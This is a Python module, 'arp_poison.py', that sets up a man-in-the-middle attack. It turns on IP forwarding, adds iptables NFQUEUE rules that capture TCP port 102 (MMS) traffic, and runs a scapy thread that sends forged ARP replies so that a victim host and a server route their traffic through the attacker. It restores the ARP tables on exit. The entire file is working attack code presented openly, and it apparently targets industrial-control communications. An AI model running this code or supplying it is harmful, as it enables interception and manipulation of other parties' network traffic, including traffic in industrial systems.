"""
arp_poison.py — ARP poisoning + system setup for MITM.

Handles:
  • sysctl net.ipv4.ip_forward toggle
  • iptables NFQUEUE rule insertion / removal
  • ARP poisoning loop (scapy-based, runs in daemon thread)

Requires: scapy, root privileges
"""
from __future__ import annotations
import subprocess
import threading
import time
import logging
from typing import Callable, Optional

logger = logging.getLogger("arp_poison")

_arp_thread: Optional[threading.Thread] = None
_stop_event = threading.Event()


# ─────────────────────────────────────────────────────────────────────────────
# IP forwarding
# ─────────────────────────────────────────────────────────────────────────────

def enable_ip_forward() -> str:
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1\n")
        return "[SYS] IP forwarding enabled (net.ipv4.ip_forward=1)"
    except PermissionError:
        return "[SYS] ERROR: cannot write /proc/sys/net/ipv4/ip_forward — need root"


def disable_ip_forward() -> str:
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0\n")
        return "[SYS] IP forwarding disabled"
    except PermissionError:
        return "[SYS] ERROR: cannot disable ip_forward — need root"


# ─────────────────────────────────────────────────────────────────────────────
# iptables NFQUEUE rule
# ─────────────────────────────────────────────────────────────────────────────

def insert_nfqueue_rule(queue_num: int = 1, port: int = 102) -> str:

    #iptables -I FORWARD -p tcp --dport 102 -j NFQUEUE --queue-num 1
    #Also adds sport rule so bidirectional MMS traffic is captured.
  
    cmds = [
        ["iptables", "-I", "FORWARD", "-p", "tcp",
         "--dport", str(port), "-j", "NFQUEUE", "--queue-num", str(queue_num)],
        ["iptables", "-I", "FORWARD", "-p", "tcp",
         "--sport", str(port), "-j", "NFQUEUE", "--queue-num", str(queue_num)],
    ]
    msgs = []
    for cmd in cmds:
        try:
            subprocess.run(cmd, check=True, capture_output=True)
            msgs.append(f"[IPT] Rule added: {' '.join(cmd[4:])}")
        except subprocess.CalledProcessError as e:
            msgs.append(f"[IPT] ERROR: {e.stderr.decode().strip()}")
        except FileNotFoundError:
            msgs.append("[IPT] ERROR: iptables not found — install iptables")
    return "\n".join(msgs)


def remove_nfqueue_rule(queue_num: int = 1, port: int = 102) -> str:
    #Remove NFQUEUE rules (cleanup on stop).
    cmds = [
        ["iptables", "-D", "FORWARD", "-p", "tcp",
         "--dport", str(port), "-j", "NFQUEUE", "--queue-num", str(queue_num)],
        ["iptables", "-D", "FORWARD", "-p", "tcp",
         "--sport", str(port), "-j", "NFQUEUE", "--queue-num", str(queue_num)],
    ]
    msgs = []
    for cmd in cmds:
        try:
            subprocess.run(cmd, check=True, capture_output=True)
            msgs.append(f"[IPT] Rule removed: {' '.join(cmd[4:])}")
        except subprocess.CalledProcessError:
            msgs.append("[IPT] Rule not found (already removed)")
        except FileNotFoundError:
            msgs.append("[IPT] iptables not found")
    return "\n".join(msgs)


# ─────────────────────────────────────────────────────────────────────────────
# ARP poisoning
# ─────────────────────────────────────────────────────────────────────────────

def _get_mac(ip: str, iface: str) -> Optional[str]:
    #ARP request to resolve MAC for an IP.
    try:
        from scapy.all import ARP, Ether, srp
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2, iface=iface, verbose=False,
        )
        if ans:
            return ans[0][1].hwsrc
              
    except Exception as e:
        logger.error(f"MAC resolution failed for {ip}: {e}")
    return None


def _arp_poison_loop(victim_ip: str, server_ip: str, iface: str,
                     interval: float, stop_event: threading.Event,
                     log_cb: Callable[[str], None]) -> None:
    """
    Continuously send ARPs:
      → victim: "Server IP is at my MAC"
      → server: "Victim IP is at my MAC"
    """
    try:
        from scapy.all import ARP, Ether, sendp, get_if_hwaddr
    except ImportError:
        log_cb("[ARP] ERROR: scapy not installed — pip install scapy")
        return

    try:
        our_mac = get_if_hwaddr(iface)
    except Exception as e:
        log_cb(f"[ARP] ERROR: cannot get MAC for {iface}: {e}")
        return

    victim_mac = _get_mac(victim_ip, iface)
    server_mac = _get_mac(server_ip, iface)

    if not victim_mac:
        log_cb(f"[ARP] ERROR: cannot resolve MAC for victim {victim_ip}")
        return
    if not server_mac:
        log_cb(f"[ARP] ERROR: cannot resolve MAC for server {server_ip}")
        return

    log_cb(f"[ARP] Victim {victim_ip} = {victim_mac}")
    log_cb(f"[ARP] Server {server_ip} = {server_mac}")
    log_cb(f"[ARP] Our MAC = {our_mac}  iface={iface}")
    log_cb(f"[ARP] Poisoning started — interval={interval}s")

    # Craft packets once
    pkt_to_victim = (
        Ether(dst=victim_mac) /
        ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
            psrc=server_ip, hwsrc=our_mac)
    )
    pkt_to_server = (
        Ether(dst=server_mac) /
        ARP(op=2, pdst=server_ip, hwdst=server_mac,
            psrc=victim_ip, hwsrc=our_mac)
    )

    while not stop_event.is_set():
        try:
            sendp([pkt_to_victim, pkt_to_server],
                  iface=iface, verbose=False)
        except Exception as e:
            log_cb(f"[ARP] send error: {e}")
        stop_event.wait(interval)

    # Restore ARP tables on exit
    log_cb("[ARP] Restoring ARP tables...")
    restore_v = (
        Ether(dst=victim_mac) /
        ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
            psrc=server_ip, hwsrc=server_mac)
    )
    restore_s = (
        Ether(dst=server_mac) /
        ARP(op=2, pdst=server_ip, hwdst=server_mac,
            psrc=victim_ip, hwsrc=victim_mac)
    )
    try:
        sendp([restore_v, restore_s] * 3, iface=iface, verbose=False)
        log_cb("[ARP] ARP tables restored")
    except Exception:
        pass


def start_arp_poison(victim_ip: str, server_ip: str, iface: str,
                     interval: float = 2.0,
                     log_cb: Callable[[str], None] = print) -> str:
    #Start ARP poisoning in a daemon thread. Returns status message.
    global _arp_thread, _stop_event
    if _arp_thread and _arp_thread.is_alive():
        return "[ARP] Already running"
    _stop_event = threading.Event()
    _arp_thread = threading.Thread(
        target=_arp_poison_loop,
        args=(victim_ip, server_ip, iface, interval, _stop_event, log_cb),
        daemon=True,
        name="arp-poison",
    )
    _arp_thread.start()
    return f"[ARP] Thread started — poisoning {victim_ip} ↔ {server_ip} via {iface}"


def stop_arp_poison() -> str:
    #Signal ARP loop to stop.
    global _stop_event
    _stop_event.set()
    return "[ARP] Stop signal sent — restoring ARP tables..."
